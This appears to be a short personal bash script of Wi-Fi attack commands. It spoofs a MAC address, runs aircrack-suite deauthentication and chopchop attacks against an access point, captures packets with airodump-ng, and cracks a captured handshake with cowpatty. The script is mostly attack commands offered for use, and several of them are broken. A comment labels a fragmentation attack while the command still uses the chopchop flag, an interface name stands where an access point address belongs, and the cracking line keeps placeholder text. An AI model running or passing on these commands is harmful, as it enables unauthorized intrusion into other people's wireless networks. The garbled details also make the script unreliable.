#! /usr/bin/bash

ifconfig "$(netface)" down
iwconfig "$(netface)" mode managed
ifconfig "$(netface)" hw ether 00:19:d2:15:f6:6b

# deauthenticate a user from an AP 
# a = Access Point, c = Client MAC Address
# -0 deauthenticate attack

# deauthenticate
 # aireplay-ng -0 1 -a 00:14:6C:7E:40:80 -c 00:0F:B5:34:30:30 wlan1

#  chopchop  attack
# -h Client MAC Address
# -a Access Point MAC Address
# -4 chopchop attack 
aireplay-ng -4 -h 00:0F:B5:34:30:30 -a wlan1

#  chopchop  attack
# -h Client MAC Address
# -b Access Point MAC Address
# -5 fragmentation attack 
aireplay-ng -4 -b 00:0F:B5:34:30:30 -h 00:0F:B5:34:30:30  wlan1

airodump-ng --channel 6 --write packet wlan1

cowpatty -s access point name -r captured file -d cuda-ext/hacking/